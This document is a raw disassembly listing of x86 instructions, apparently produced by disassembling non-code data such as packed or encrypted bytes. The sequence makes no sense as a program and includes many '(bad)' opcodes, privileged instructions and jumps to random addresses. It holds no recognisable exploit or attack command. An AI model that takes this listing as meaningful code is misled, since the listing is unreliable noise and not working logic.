  41b307:	push   esi
  41b308:	push   esi
  41b309:	xchg   ebp,eax
  41b30a:	cmp    eax,0x2835c6da
  41b30f:	scas   eax,DWORD PTR es:[edi]
  41b310:	pop    es
  41b311:	ins    BYTE PTR es:[edi],dx
  41b312:	mov    dl,0xf1
  41b314:	icebp  
  41b315:	imul   ebx,DWORD PTR [ebx],0x6dd77e32
  41b31b:	dec    esp
  41b31c:	dec    esi
  41b31d:	dec    ecx
  41b31e:	mov    bh,0xb7
  41b320:	aaa    
  41b321:	push   es
  41b322:	cmp    bl,BYTE PTR [esi+eax*2]
  41b325:	xchg   BYTE PTR [eax],bh
  41b327:	jmp    0xadf1:0x38f624d3
  41b32e:	sub    BYTE PTR ds:0x96edb36d,ch
  41b334:	inc    esp
  41b335:	jecxz  0x41b343
  41b337:	sub    eax,0x35bdde43
  41b33c:	cmp    eax,0x1d3338bf
  41b341:	jo     0x41b2d7
  41b343:	lock xor eax,0xd006f78b
  41b349:	inc    ecx
  41b34a:	dec    eax
  41b34b:	jne    0x41b32a
  41b34d:	dec    esp
  41b34e:	popa   
  41b34f:	cdq    
  41b350:	cdq    
  41b351:	push   0x76eb885d
  41b356:	lea    edi,[ebx]
  41b358:	(bad)  [edi]
  41b35a:	leave  
  41b35b:	xor    al,0xcf
  41b35d:	stc    
  41b35e:	mov    BYTE PTR [ecx-0x2b],dh
  41b361:	push   0xffffffc0
  41b363:	and    dh,BYTE PTR [ecx-0x6eaed67f]
  41b369:	aaa    
  41b36a:	aas    
  41b36b:	xchg   esi,eax
  41b36c:	adc    al,BYTE PTR [ebx-0x15bcb92f]
  41b372:	pop    ss
  41b373:	push   esp
  41b374:	sub    ebp,DWORD PTR [edi]
  41b376:	jge    0x41b313
  41b378:	jns    0x41b3b1
  41b37a:	lods   eax,DWORD PTR ds:[esi]
  41b37b:	mov    eax,ds:0xe9c377db
  41b380:	push   ebx
  41b381:	pop    esp
  41b382:	ds jecxz 0x41b362
  41b385:	jl     0x41b334
  41b387:	jns    0x41b35c
  41b389:	pop    esi
  41b38a:	cmp    BYTE PTR [ebp+0x3a402caa],dl
  41b390:	sbb    BYTE PTR [eax],ch
  41b392:	ins    BYTE PTR es:[edi],dx
  41b393:	cmp    DWORD PTR ds:0x41de4644,eax
  41b399:	mov    ebp,0xb21453d8
  41b39e:	imul   edi,DWORD PTR [edx+0x2d],0x5f
  41b3a2:	in     eax,dx
  41b3a3:	jle    0x41b368
  41b3a5:	cmp    BYTE PTR [eax-0x8f7b340],bl
  41b3ab:	fstp   QWORD PTR ds:0xc2f5af4a
  41b3b1:	mov    ah,0xb1
  41b3b3:	pop    ds
  41b3b4:	jmp    0x41b401
  41b3b6:	cs add al,0xa6
  41b3b9:	adc    al,0x7d
  41b3bb:	and    eax,0x4543dfa4
  41b3c0:	mov    ecx,0x10b0ed82
  41b3c5:	xchg   edi,eax
  41b3c6:	imul   edi,ecx,0x262a9322
  41b3cc:	loope  0x41b402
  41b3ce:	shl    edx,0x41
  41b3d1:	push   es
  41b3d2:	test   DWORD PTR [edi+0x306cc03f],edi
  41b3d8:	add    DWORD PTR [edx+ecx*2],edx
  41b3db:	push   es
  41b3dc:	lods   eax,DWORD PTR ds:[esi]
  41b3dd:	xor    BYTE PTR [edx],0xda
  41b3e0:	retf   
  41b3e1:	retf   
  41b3e2:	sbb    BYTE PTR [ebx],dh
  41b3e4:	arpl   sp,bp
  41b3e6:	call   0x9d9af54
  41b3eb:	call   0x6d56:0x490ee60c
  41b3f2:	clc    
  41b3f3:	scas   al,BYTE PTR es:[edi]
  41b3f4:	and    eax,0x8d27e877
  41b3f9:	repnz in al,0xc1
  41b3fc:	aad    0x16
  41b3fe:	gs mov ah,0x38
  41b401:	xchg   edi,eax
  41b402:	cli    
  41b403:	jmp    0x5dd8fb26
  41b408:	pop    edx
  41b409:	iret   
  41b40a:	pop    es
  41b40b:	stos   BYTE PTR es:[edi],al
  41b40c:	pop    es
  41b40d:	rcr    bl,0x9b
  41b410:	pop    edx
  41b411:	out    0x5c,eax
  41b413:	bound  esp,QWORD PTR [ecx-0x38]
  41b416:	mov    ecx,0xca2c2be5
  41b41b:	das    
  41b41c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b41d:	mov    edx,0x8f7d9cbc
  41b422:	mov    al,0x2c
  41b424:	aam    0xa
  41b426:	mov    ch,0x34
  41b428:	mov    eax,ds:0x1c142a4a
  41b42d:	clc    
  41b42e:	push   ss
  41b42f:	xor    al,0x3a
  41b431:	push   esp
  41b432:	jne    0x41b4a2
  41b434:	adc    ch,dl
  41b436:	ins    BYTE PTR es:[edi],dx
  41b437:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b438:	fldcw  WORD PTR [ecx-0xb]
  41b43b:	cmp    eax,0x501b1e37
  41b440:	(bad)  
  41b441:	pop    esi
  41b442:	xchg   ecx,eax
  41b443:	inc    ebp
  41b444:	cmc    
  41b445:	sbb    ebp,DWORD PTR [esi+0x4e4991e8]
  41b44b:	iret   
  41b44c:	iret   
  41b44d:	sub    bl,BYTE PTR [esi-0xa]
  41b450:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b451:	push   esp
  41b452:	hlt    
  41b453:	pop    esp
  41b454:	test   eax,0xa2921cc2
  41b459:	ret    
  41b45a:	test   edx,ecx
  41b45c:	cmp    dh,BYTE PTR [edi+0x7a58f461]
  41b462:	push   edx
  41b463:	cwde   
  41b464:	lock lea ebp,[ebx+0x17]
  41b468:	inc    eax
  41b469:	lds    edi,FWORD PTR [esp+0x73ec2576]
  41b470:	mov    ch,0x1b
  41b472:	xchg   edi,eax
  41b473:	dec    eax
  41b474:	data16 add al,0xe6
  41b477:	loopne 0x41b4ac
  41b479:	lock pop ebx
  41b47b:	jns    0x41b4d4
  41b47d:	mov    ebx,0xd388aed7
  41b482:	cmp    BYTE PTR [edi-0x20d7fca1],dl
  41b488:	shr    eax,cl
  41b48a:	mov    ebx,0xc6fe4264
  41b48f:	mov    dl,0xc8
  41b491:	cmp    al,0x6f
  41b493:	or     dh,BYTE PTR [edx]
  41b495:	mov    dh,0x25
  41b497:	jb     0x41b507
  41b499:	mov    ds:0x4bbdc1c7,al
  41b49e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b49f:	add    edx,DWORD PTR [edx-0x3a02a31f]
  41b4a5:	cld    
  41b4a6:	add    BYTE PTR [edx],0xf5
  41b4a9:	ret    
  41b4aa:	in     eax,0xc2
  41b4ac:	leave  
  41b4ad:	xchg   ebp,eax
  41b4ae:	xor    DWORD PTR [ecx],esp
  41b4b0:	mov    bl,0x7d
  41b4b2:	pop    ebp
  41b4b3:	mov    eax,ecx
  41b4b5:	xor    ah,BYTE PTR [edi-0x5f]
  41b4b8:	inc    ecx
  41b4b9:	mov    ecx,esi
  41b4bb:	retf   
  41b4bc:	mov    BYTE PTR [ebp+0x57],0x76
  41b4c0:	xchg   ebx,eax
  41b4c1:	jae    0x41b497
  41b4c3:	or     ebp,ebp
  41b4c5:	fdivp  st(3),st
  41b4c7:	repnz mov bl,0xf9
  41b4ca:	sti    
  41b4cb:	mov    edx,0x9ea86cf4
  41b4d0:	mov    ah,0xf
  41b4d2:	idiv   dl
  41b4d4:	lods   al,BYTE PTR ds:[esi]
  41b4d5:	adc    al,0xbf
  41b4d7:	push   edx
  41b4d8:	ret    
  41b4d9:	adc    dh,BYTE PTR [eax-0x74]
  41b4dc:	std    
  41b4dd:	add    al,0x1a
  41b4df:	push   ecx
  41b4e0:	fst    DWORD PTR [ebp+eiz*2+0x2e189141]
  41b4e7:	inc    ecx
  41b4e8:	xor    ch,BYTE PTR [ecx+ecx*2]
  41b4eb:	push   esi
  41b4ec:	inc    ecx
  41b4ed:	dec    ebp
  41b4ee:	imul   ecx,DWORD PTR [ecx],0x7ae97eb0
  41b4f4:	xor    eax,0xb2ad1af1
  41b4f9:	and    bl,dh
  41b4fb:	jg     0x41b4c5
  41b4fd:	fst    QWORD PTR ss:0xf4f755f6
  41b504:	repz jecxz 0x41b4f3
  41b507:	adc    al,0xa2
  41b509:	cdq    
  41b50a:	loopne 0x41b4be
  41b50c:	out    0x7a,eax
  41b50e:	xchg   ebx,eax
  41b50f:	call   0xf515:0xa4a1514f
  41b516:	bound  ebx,QWORD PTR [eax+edi*8+0x75a034fa]
  41b51d:	xchg   edx,eax
  41b51e:	adc    eax,0xa3fdccb1
  41b523:	(bad)  
  41b524:	push   edi
  41b525:	sahf   
  41b526:	fcmovnbe st,st(7)
  41b528:	mov    edi,edi
  41b52a:	jnp    0x41b59e
  41b52c:	push   edi
  41b52d:	xor    BYTE PTR [eax-0x7e],cl
  41b530:	xchg   esi,eax
  41b531:	jb     0x41b532
  41b533:	mov    ds:0xf118b9b3,al
  41b538:	xchg   ebp,eax
  41b539:	jp     0x41b4e2
  41b53b:	lods   eax,DWORD PTR ds:[esi]
  41b53c:	inc    esi
  41b53d:	std    
  41b53e:	int    0x77
  41b540:	outs   dx,BYTE PTR ds:[esi]
  41b541:	cmp    BYTE PTR [esp+edi*1],cl
  41b544:	xor    DWORD PTR [ebx],edx
  41b546:	mov    ds:0xd08f8dd4,al
  41b54b:	sub    dh,BYTE PTR [eax]
  41b54d:	ins    DWORD PTR es:[edi],dx
  41b54e:	cmp    BYTE PTR [edx-0x62],dh
  41b551:	push   0x47
  41b553:	leave  
  41b554:	xchg   ecx,eax
  41b555:	in     al,0xb9
  41b557:	push   ebx
  41b558:	xchg   DWORD PTR [esi+0x55966e0],edx
  41b55e:	in     eax,dx
  41b55f:	in     eax,dx
  41b560:	cld    
  41b561:	repz (bad) 
  41b563:	sub    DWORD PTR [edx],eax
  41b565:	jne    0x41b51e
  41b567:	in     eax,0xc1
  41b569:	xchg   esp,eax
  41b56a:	(bad)  
  41b56b:	push   esi
  41b56c:	jmp    0x6a7b:0x70951384
  41b573:	sub    DWORD PTR [esi],0x52934f7a
  41b579:	icebp  
  41b57a:	stos   DWORD PTR es:[edi],eax
  41b57b:	imul   ebp,esi,0x53
  41b57e:	inc    esi
  41b57f:	into   
  41b580:	jae    0x41b577
  41b582:	test   BYTE PTR [ecx+0x275b5f02],cl
  41b588:	aaa    
  41b589:	or     edx,DWORD PTR [eax+ecx*8-0x50]
  41b58d:	sahf   
  41b58e:	shl    DWORD PTR [ebx-0x68d78d7a],1
  41b594:	push   0xfa21511a
  41b599:	jmp    0x41b56b
  41b59b:	mov    dl,0x7f
  41b59d:	mov    al,ss:0x6f3a365a
  41b5a3:	mov    eax,0xd13e6e4a
  41b5a8:	pop    edi
  41b5a9:	lock fmul DWORD PTR [ebx-0x2c]
  41b5ad:	jle    0x41b557
  41b5af:	ins    BYTE PTR es:[edi],dx
  41b5b0:	inc    esi
  41b5b1:	jo     0x41b5cc
  41b5b3:	or     DWORD PTR [eax+0x4],0x1b
  41b5b7:	jg     0x41b596
  41b5b9:	pop    eax
  41b5ba:	push   ss
  41b5bb:	jns    0x41b5f0
  41b5bd:	push   0xffffffef
  41b5bf:	fwait
  41b5c0:	ret    0xd24d
  41b5c3:	ficom  DWORD PTR [ecx-0x7d8e849e]
  41b5c9:	jae    0x41b575
  41b5cb:	dec    ebx
  41b5cc:	lea    esi,[ebx-0xce44d52]
  41b5d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5d3:	shl    DWORD PTR [ebx+0x63b53ee3],0xb4
  41b5da:	adc    eax,0xc6376405
  41b5df:	dec    ebx
  41b5e0:	cli    
  41b5e1:	dec    ecx
  41b5e2:	ret    0xc012
  41b5e5:	rcl    BYTE PTR [eax+ecx*1],1
  41b5e8:	enter  0x3b66,0x21
  41b5ec:	mov    cl,0xf6
  41b5ee:	in     al,0xa2
  41b5f0:	sub    dh,al
  41b5f2:	mov    ds:0x844330fa,eax
  41b5f7:	pop    esi
  41b5f8:	sbb    BYTE PTR [esi+0x49],dl
  41b5fb:	aam    0x3a
  41b5fd:	add    edx,ecx
  41b5ff:	leave  
  41b600:	mov    bl,0x75
  41b602:	cmp    BYTE PTR [edx+ebx*4],al
  41b605:	ror    BYTE PTR [esi+0x1e2699df],1
  41b60b:	loope  0x41b5d9
  41b60d:	dec    esi
  41b60e:	cli    
  41b60f:	and    al,0x24
  41b611:	pop    ss
  41b612:	xchg   edi,eax
  41b613:	sahf   
  41b614:	adc    ah,dl
  41b616:	fiadd  DWORD PTR [edx+0x60]
  41b619:	jb     0x41b63a
  41b61b:	jb     0x41b66a
  41b61d:	or     esi,DWORD PTR [ebp+0x5a879ce]
  41b623:	or     edi,DWORD PTR [ebp+0x7cfe9a98]
  41b629:	xchg   esi,eax
  41b62a:	repz fmul st,st(1)
  41b62d:	jg     0x41b650
  41b62f:	test   al,0x4d
  41b631:	inc    edx
  41b632:	lds    edx,FWORD PTR [edx+0x11]
  41b635:	mov    ah,0xf8
  41b637:	push   esp
  41b638:	cmp    DWORD PTR [esi+ecx*2],0x4e19b9f5
  41b63f:	adc    DWORD PTR [eax+0x78c1c155],ebp
  41b645:	fisttp DWORD PTR [ebp+ebx*4+0x25439c23]
  41b64c:	jb     0x41b610
  41b64e:	(bad)  
  41b64f:	std    
  41b650:	add    ecx,DWORD PTR [edi+0x76]
  41b653:	retf   0x9000
  41b656:	(bad)  
  41b657:	and    al,0x4e
  41b659:	cmc    
  41b65a:	or     al,BYTE PTR [ebp+esi*2+0xa5cdf92]
  41b661:	and    esp,edi
  41b663:	aas    
  41b664:	push   esp
  41b665:	je     0x41b623
  41b667:	mov    esi,0xb89272a4
  41b66c:	lock fwait
  41b66e:	push   edi
  41b66f:	cdq    
  41b670:	xchg   DWORD PTR [eax-0x62ab9c24],ebx
  41b676:	lea    esi,[ebp+0x5fbd23ed]
  41b67c:	jge    0x41b681
  41b67e:	pop    ebp
  41b67f:	in     eax,0x69
  41b681:	cmp    al,0xdd
  41b683:	sub    ch,BYTE PTR [esi+0x3548dd01]
  41b689:	push   ebp
  41b68a:	xchg   edi,eax
  41b68b:	add    al,BYTE PTR [edi+0x698c309]
  41b691:	cmp    al,0x13
  41b693:	pop    edx
  41b694:	mov    edx,0x2ad223b1
  41b699:	retf   0xf28b
  41b69c:	cmp    DWORD PTR [esi-0x15],ebp
  41b69f:	pop    ecx
  41b6a0:	adc    eax,0x39c268c9
  41b6a5:	stos   BYTE PTR es:[edi],al
  41b6a6:	sub    bl,BYTE PTR [eax]
  41b6a8:	add    edx,DWORD PTR [ebp+0x75]
  41b6ab:	pop    ebx
  41b6ac:	loope  0x41b6af
  41b6ae:	outs   dx,BYTE PTR ds:[esi]
  41b6af:	xor    al,BYTE PTR [edx+0x70c27cbe]
  41b6b5:	or     al,0x96
  41b6b7:	dec    edi
  41b6b8:	inc    esi
  41b6b9:	ret    
  41b6ba:	mov    edx,DWORD PTR [ebp-0x69]
  41b6bd:	ja     0x41b643
  41b6bf:	jp     0x41b70f
  41b6c1:	dec    edx
  41b6c2:	mov    dh,0x4
  41b6c4:	arpl   WORD PTR [edi],bx
  41b6c6:	ret    0x2bcf
  41b6c9:	(bad)  
  41b6ca:	jge    0x41b708
  41b6cc:	mov    eax,ds:0xda3c6a34
  41b6d1:	pop    ebp
  41b6d2:	and    dh,BYTE PTR [ebx+0x5ae77466]
  41b6d8:	mov    al,0x5e
  41b6da:	dec    esp
  41b6db:	mov    bh,0xc2
  41b6dd:	call   0xae95:0x951d4afa
  41b6e4:	xchg   DWORD PTR [eax-0x7026497a],ebx
  41b6ea:	aaa    
  41b6eb:	sub    ch,cl
  41b6ed:	mov    ah,0x8f
  41b6ef:	and    DWORD PTR [ebx+0x60],esi
  41b6f2:	jg     0x41b6db
  41b6f4:	sub    al,ah
  41b6f6:	add    BYTE PTR [esi-0x52],ch
  41b6f9:	mov    eax,ds:0x1ffe2acf
  41b6fe:	xchg   BYTE PTR [ebp+0x1a016c43],dh
  41b704:	call   0x6386edaa
  41b709:	push   es
  41b70a:	xor    eax,0x2a07d8de
  41b70f:	out    dx,eax
  41b710:	aad    0xd0
  41b712:	pop    esi
  41b713:	adc    al,0x9c
  41b715:	sub    dh,dh
  41b717:	or     bl,ch
  41b719:	leave  
  41b71a:	sub    BYTE PTR [esi+0x15],ah
  41b71d:	jmp    DWORD PTR [ecx-0x40164810]
  41b723:	repnz sub cl,BYTE PTR [esi+0x68]
  41b727:	imul   esp,DWORD PTR [ecx-0x6a8a8921],0xffffffb8
  41b72e:	cmc    
  41b72f:	test   BYTE PTR [ecx],al
  41b731:	std    
  41b732:	add    al,0x5d
  41b734:	popa   
  41b735:	push   edi
  41b736:	jg     0x41b734
  41b738:	inc    esi
  41b739:	hlt    
  41b73a:	repz jo 0x41b722
  41b73d:	lods   al,BYTE PTR ds:[esi]
  41b73e:	push   es
  41b73f:	cmp    eax,0xd62b2d17
  41b744:	sub    BYTE PTR [ecx+0x24],al
  41b747:	(bad)
  41b74c:	and    ebp,DWORD PTR [ebx-0x4b]
  41b74f:	lods   al,BYTE PTR ds:[esi]
  41b750:	and    DWORD PTR [ecx+edi*4+0x28],edi
  41b754:	int3   
  41b755:	test   DWORD PTR [eax],0xd89c967
  41b75b:	(bad)  
  41b75c:	or     ch,ch
  41b75e:	shl    edx,0x1
  41b761:	mov    edi,0xf1dbcd8c
  41b766:	or     BYTE PTR [esi+edx*8+0x9e952d5],bl
  41b76d:	outs   dx,BYTE PTR ds:[esi]
  41b76e:	and    BYTE PTR [edi],0x3a
  41b771:	aaa    
  41b772:	xor    edx,ebp
  41b774:	inc    edx
  41b775:	addr16 ret 0xba20
  41b779:	or     eax,0x961930a7
  41b77e:	test   DWORD PTR [eax+0x18],0xa2ed8045
  41b785:	not    DWORD PTR [ecx+ecx*1+0x69761563]
  41b78c:	stos   BYTE PTR es:[edi],al
  41b78d:	test   DWORD PTR [edx+0x648cd42d],ebx
  41b793:	mov    bh,0xf3
  41b795:	and    eax,0x1d875e3b
  41b79a:	inc    esp
  41b79b:	mov    dh,0x8c
  41b79d:	mov    bh,0xa3
  41b79f:	hlt    
  41b7a0:	out    0x37,al
  41b7a2:	pop    es
  41b7a3:	inc    ebp
  41b7a4:	lea    ecx,[edx+0x4f25081b]
  41b7aa:	adc    DWORD PTR [ecx-0x46],ecx
  41b7ad:	jmp    0xf685:0x5200413c
  41b7b4:	lea    edi,[ebp-0x54]
  41b7b7:	outs   dx,DWORD PTR ds:[esi]
  41b7b8:	adc    bh,ah
  41b7ba:	(bad)  
  41b7bb:	adc    BYTE PTR [ecx-0x57cff49c],0xe1
  41b7c2:	sub    al,0x54
  41b7c4:	sub    eax,0x9b8cb181
  41b7c9:	stos   BYTE PTR es:[edi],al
  41b7ca:	mov    ds:0x1cca6cc6,al
  41b7cf:	lock push ss
  41b7d1:	pop    eax
  41b7d2:	out    dx,al
  41b7d3:	outs   dx,BYTE PTR ds:[esi]
  41b7d4:	xchg   esi,eax
  41b7d5:	xor    eax,esi
  41b7d7:	push   esp
  41b7d8:	pushf  
  41b7d9:	xor    eax,0x1ba267c7
  41b7de:	xor    eax,0x7b52499b
  41b7e3:	enter  0x58bb,0xbf
  41b7e7:	stos   BYTE PTR es:[edi],al
  41b7e8:	mov    esi,0x8fd5bb93
  41b7ed:	addr16 out 0x2e,eax
  41b7f0:	mov    esp,0x8a1887a9
  41b7f5:	adc    eax,0xdedf80db
  41b7fa:	cmp    ecx,edx
  41b7fc:	or     DWORD PTR [ecx-0x2d64c2f8],ecx
  41b802:	jecxz  0x41b866
  41b804:	xor    ebp,edx
  41b806:	sar    DWORD PTR fs:[edx-0x35],cl
  41b80a:	jge    0x41b870
  41b80c:	jp     0x41b86a
  41b80e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b80f:	push   0xffffffec
  41b811:	xor    al,0x59
  41b813:	and    ebp,DWORD PTR [ecx-0x45237ba3]
  41b819:	sub    ah,BYTE PTR [eax-0x1d2eb2c9]
  41b81f:	aaa    
  41b820:	pop    ss
  41b821:	pop    edx
  41b822:	dec    esp
  41b823:	fstp   QWORD PTR [esp+eax*8+0x4737d574]
  41b82a:	bound  edi,QWORD PTR ds:0x106d1963
  41b830:	std    
  41b831:	add    esi,DWORD PTR [ebx-0x60]
  41b834:	addr16 mov bh,0x9d
  41b837:	fistp  DWORD PTR [ecx+esi*1-0x21fe40d2]
  41b83e:	jle    0x41b858
  41b840:	scas   al,BYTE PTR es:[edi]
  41b841:	js     0x41b8a7
  41b843:	test   BYTE PTR [esp+esi*4],0xb9
  41b847:	sub    DWORD PTR [edi],eax
  41b849:	cmp    eax,0x325d4956
  41b84e:	pop    ecx
  41b84f:	div    BYTE PTR [ecx+edx*8+0x75bb93e5]
  41b856:	inc    ebx
  41b857:	ret    
  41b858:	push   0xffffffab
  41b85a:	cmp    esi,DWORD PTR [edi-0x6d620919]
  41b860:	les    edi,FWORD PTR [edi+0x81b1173]
  41b866:	jge    0x41b8c6
  41b868:	and    BYTE PTR [edi+ebp*2],bl
  41b86b:	push   es
  41b86c:	mov    dl,BYTE PTR [ebp-0x18b21359]
  41b872:	pop    ebp
  41b873:	(bad)  
  41b875:	call   0xdae6:0xbe23feb1
  41b87c:	(bad)  
  41b87d:	in     eax,0xa0
  41b87f:	(bad)  
  41b880:	enter  0xdf59,0x17
  41b884:	sar    DWORD PTR [ecx],1
  41b886:	cdq    
  41b887:	sbb    al,0x2f
  41b889:	in     eax,dx
  41b88a:	adc    DWORD PTR [ecx-0x753f1208],ebx
  41b890:	lea    edx,[edi+0x8]
  41b893:	je     0x41b8e1
  41b895:	push   eax
  41b896:	ins    BYTE PTR es:[edi],dx
  41b897:	pop    edi
  41b898:	jns    0x41b8c9
  41b89a:	bound  esi,QWORD PTR [edi]
  41b89c:	ror    cl,cl
  41b89e:	add    al,BYTE PTR [ecx+0x7c]
  41b8a1:	jmp    0x92e55860
  41b8a6:	fwait
  41b8a7:	outs   dx,DWORD PTR ds:[esi]
  41b8a8:	stos   DWORD PTR es:[edi],eax
  41b8a9:	fwait
  41b8aa:	sub    eax,0x39f6bd30
  41b8af:	(bad)  
  41b8b1:	std    
  41b8b2:	outs   dx,DWORD PTR ds:[esi]
  41b8b3:	jg     0x41b856
  41b8b5:	add    edi,esi
  41b8b7:	mov    dh,0xda
  41b8b9:	sub    bh,0xd3
  41b8bc:	and    eax,0x96fa4780
  41b8c1:	jne    0x41b93d
  41b8c3:	aaa    
  41b8c4:	outs   dx,DWORD PTR ds:[esi]
  41b8c5:	aam    0xe0
  41b8c7:	rcr    BYTE PTR [edi],0xf9
  41b8ca:	retf   
  41b8cb:	in     eax,dx
  41b8cc:	adc    edx,esi
  41b8ce:	mov    eax,ds:0x6da5c4b6
  41b8d3:	xchg   ebx,eax
  41b8d4:	nop
  41b8d5:	inc    edx
  41b8d6:	cmc    
  41b8d7:	xchg   ebp,eax
  41b8d8:	jmp    0x1100:0x91f198a7
  41b8df:	or     DWORD PTR [edi],edi
  41b8e1:	jg     0x41b8c0
  41b8e3:	aam    0x7b
  41b8e5:	fnstenv [edx+0x361837c2]
  41b8eb:	or     DWORD PTR [ebx-0x5],ebx
  41b8ee:	fiadd  WORD PTR [ebp-0x4c4c5548]
  41b8f4:	scas   eax,DWORD PTR es:[edi]
  41b8f5:	and    esi,esi
  41b8f7:	mov    ch,0x52
  41b8f9:	mov    ah,0x91
  41b8fb:	push   es
  41b8fc:	push   esp
  41b8fd:	pop    ss
  41b8fe:	mov    eax,0x9dee6a7d
  41b903:	push   esp
  41b904:	imul   edi,DWORD PTR [ecx-0x4d],0x42
  41b908:	sub    ecx,DWORD PTR [edi]
  41b90a:	mov    esp,0x3d348122
  41b90f:	dec    ebx
  41b910:	xor    al,0x17
  41b912:	popf   
  41b913:	imul   BYTE PTR [edx-0x68]
  41b916:	out    0x34,al
  41b918:	in     al,dx
  41b919:	push   ecx
  41b91a:	push   esp
  41b91b:	fsubr  st,st(2)
  41b91d:	mov    esi,0x8551886d
  41b922:	in     eax,dx
  41b923:	popa   
  41b924:	dec    ebx
  41b925:	pop    esi
  41b926:	cmc    
  41b927:	sub    BYTE PTR [edi],dl
  41b929:	mov    ds:0xd03aef65,eax
  41b92e:	out    dx,al
  41b92f:	cmp    DWORD PTR [ebx+0x360a0d88],ebp
  41b935:	adc    BYTE PTR [eax-0x27680145],ch
  41b93b:	xor    eax,0xcae33990
  41b940:	popa   
  41b941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b942:	inc    edi
  41b943:	mov    al,0x78
  41b945:	jb     0x41b967
  41b947:	xor    BYTE PTR [eax-0x3e],0x86
  41b94b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b94c:	dec    ebx
  41b94d:	outs   dx,DWORD PTR ds:[esi]
  41b94e:	imul   edx,DWORD PTR [esi+0x6a],0x2e7792a
  41b955:	dec    edx
  41b956:	lea    edx,ds:0x49a434c4
  41b95c:	or     cl,BYTE PTR [esi]
  41b95e:	mov    ecx,0xb46c7e6c
  41b963:	call   0xe35c:0xd36b26e5
  41b96a:	mov    edx,0xa3b9ae4c
  41b96f:	push   ebp
  41b970:	sbb    eax,0x6a26e838
  41b975:	xlat   BYTE PTR ds:[ebx]
  41b976:	and    DWORD PTR [esi],ebp
  41b978:	pushf  
  41b979:	outs   dx,BYTE PTR ds:[esi]
  41b97a:	mov    ebx,0xeb6812b8
  41b97f:	mov    edi,0x5eb74626
  41b984:	cmc    
  41b985:	leave  
  41b986:	sbb    BYTE PTR [ebx-0x20e36934],cl
  41b98c:	sti    
  41b98d:	xchg   ebp,eax
  41b98e:	sbb    DWORD PTR [edx-0x7c3b1e2],edi
  41b994:	jl     0x41b979
  41b996:	adc    eax,0x4d613fe9
  41b99b:	sub    BYTE PTR [ecx-0x76],dl
  41b99e:	xchg   edi,eax
  41b99f:	in     al,dx
  41b9a0:	jecxz  0x41b9f7
  41b9a2:	or     ch,bl
  41b9a4:	inc    edx
  41b9a5:	out    0x9c,al
  41b9a7:	jp     0x41b9ad
  41b9a9:	push   ecx
  41b9aa:	pop    ss
  41b9ab:	test   BYTE PTR [edx+0xf21b850],cl
  41b9b1:	add    eax,0x8ca06606
  41b9b6:	push   eax
  41b9b7:	xor    esp,ebp
  41b9b9:	shr    DWORD PTR [esi-0x235910e],1
  41b9bf:	adc    ecx,DWORD PTR [edx-0x6f]
  41b9c2:	cmp    edx,ebx
  41b9c4:	sahf   
  41b9c5:	dec    esi
  41b9c6:	add    al,dh
  41b9c8:	js     0x41b9cb
  41b9ca:	mov    al,ds:0xc962fde6
  41b9cf:	sub    al,0x84
  41b9d1:	pop    es
  41b9d2:	leave  
  41b9d3:	stc    
  41b9d4:	or     DWORD PTR [eax-0x70],esp
  41b9d7:	jbe    0x41ba53
  41b9d9:	inc    edi
  41b9da:	popa   
  41b9db:	in     eax,0xb0
  41b9dd:	sti    
  41b9de:	jecxz  0x41b960
  41b9e0:	mov    ds:0x698e496b,al
  41b9e5:	in     eax,0xca
  41b9e7:	or     BYTE PTR [ebp+0x70],dh
  41b9ea:	scas   eax,DWORD PTR es:[edi]
  41b9eb:	mov    eax,ds:0x3c0fd42c
  41b9f0:	jl     0x41ba20
  41b9f2:	pop    ebx
  41b9f3:	in     al,0x4d
  41b9f5:	pop    eax
  41b9f6:	aaa    
  41b9f7:	bound  ebx,QWORD PTR [edx]
  41b9f9:	pushf  
  41b9fa:	imul   DWORD PTR [ecx-0x60cc847d]
  41ba00:	push   edx
  41ba01:	retf   0x3295
  41ba04:	je     0x41ba57
  41ba06:	lds    esp,FWORD PTR [eax]
  41ba08:	xchg   ecx,eax
  41ba09:	xor    dh,bl
  41ba0b:	or     BYTE PTR [esi],bh
  41ba0d:	in     eax,dx
  41ba0e:	outs   dx,DWORD PTR ds:[esi]
  41ba0f:	into   
  41ba10:	ins    DWORD PTR es:[edi],dx
  41ba11:	iret   
  41ba12:	mov    ebp,0x4b749ffa
  41ba17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba18:	aam    0x7
  41ba1a:	adc    eax,0x9a138ce4
  41ba1f:	and    esp,edi
  41ba21:	jp     0x41ba45
  41ba23:	inc    esi
  41ba24:	ins    DWORD PTR es:[edi],dx
  41ba25:	cli    
  41ba26:	mov    al,ds:0xd72afab7
  41ba2b:	add    ebx,DWORD PTR [ebx-0x5711dda8]
  41ba31:	ss lahf 
  41ba33:	call   0x5a60e7be
  41ba38:	jnp    0x41ba57
  41ba3a:	pop    es
  41ba3b:	add    al,0xa3
  41ba3d:	jb     0x41ba15
  41ba3f:	es in  al,0xfc
  41ba42:	in     eax,dx
  41ba43:	adc    BYTE PTR [ebp+0x6131382b],0x9
  41ba4a:	push   0x7c
  41ba4c:	sub    DWORD PTR [esi],0xc2f42228
  41ba52:	dec    esi
  41ba53:	ret    0x70cf
  41ba56:	mov    bl,0x92
  41ba58:	pop    edx
  41ba59:	inc    ebx
  41ba5a:	arpl   WORD PTR [eax],ax
  41ba5c:	ficomp WORD PTR [ebp-0x2d]
  41ba5f:	dec    eax
  41ba60:	packssdw mm1,QWORD PTR [esi-0x6bca1b50]
  41ba67:	push   edi
  41ba68:	jp     0x41bac0
  41ba6a:	xor    DWORD PTR [esi+edi*1+0x59],0x5b
  41ba6f:	add    edx,ebx
  41ba71:	scas   al,BYTE PTR es:[edi]
  41ba72:	ins    BYTE PTR es:[edi],dx
  41ba73:	xchg   esp,eax
  41ba74:	dec    eax
  41ba75:	aad    0x1a
  41ba77:	lahf   
  41ba78:	cld    
  41ba79:	inc    ebp
  41ba7a:	lods   al,BYTE PTR ds:[esi]
  41ba7b:	sub    eax,0xe636939a
  41ba80:	xchg   edx,eax
  41ba81:	out    dx,eax
  41ba82:	xor    esp,ebx
  41ba84:	jge    0x41ba99
